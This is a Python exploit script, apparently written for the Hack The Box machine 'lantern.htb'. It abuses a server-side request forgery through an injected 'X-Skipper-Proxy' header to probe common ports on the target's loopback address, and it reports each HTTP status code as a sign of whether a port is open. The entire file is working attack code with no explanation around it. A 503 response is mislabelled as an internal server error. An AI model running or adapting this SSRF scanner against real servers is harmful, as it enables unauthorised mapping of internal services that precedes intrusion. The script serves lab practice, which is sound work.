import requests
from pwn import *
bar = log.progress("Enumerate ports for local network via SSRF")
# Target host and headers
target_host = "http://lantern.htb/"
headers = {
    "Host": "lantern.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://lantern.htb/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}
# List of common ports to enumerate
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 8080, 8443, 5000, 8000]
# Function to check a port via SSRF
def check_port(port):
    bar.status(f"Testing port {port} for 127.0.0.1 ...")
    headers["X-Skipper-Proxy"] = f"http://127.0.0.1:{port}"
    try:
        response = requests.get(target_host, headers=headers)
        if response.status_code == 200:
            print(f"Port {port} is open - Response: {response.status_code}")
        elif response.status_code == 302:
            print(f"Port {port} redirect - Response: {response.status_code}")
        elif response.status_code == 403:
            print(f"Port {port} Forbidden - Response: {response.status_code}")
        elif response.status_code == 404:
            print(f"Port {port} Not Found - Response: {response.status_code}")
        elif response.status_code == 500:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        elif response.status_code == 503:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        else:
            print(f"Port {port} returned status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Port {port} is closed or not reachable - Error: {e}")
# Enumerate through common ports
for port in common_ports:
    check_port(port)
    
bar.success("Finish!")
